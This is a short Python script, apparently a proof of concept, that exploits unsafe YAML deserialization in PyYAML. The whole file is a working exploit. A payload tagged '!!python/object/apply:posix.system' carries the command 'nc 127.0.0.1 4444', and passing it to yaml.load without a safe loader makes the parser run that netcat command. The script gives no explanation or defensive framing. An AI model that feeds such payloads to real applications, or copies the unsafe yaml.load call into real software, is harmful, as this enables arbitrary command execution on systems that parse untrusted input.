import yaml

exploit = b"""!!python/object/apply:posix.system [nc 127.0.0.1 4444]"""
data = yaml.load(exploit)
print(data)
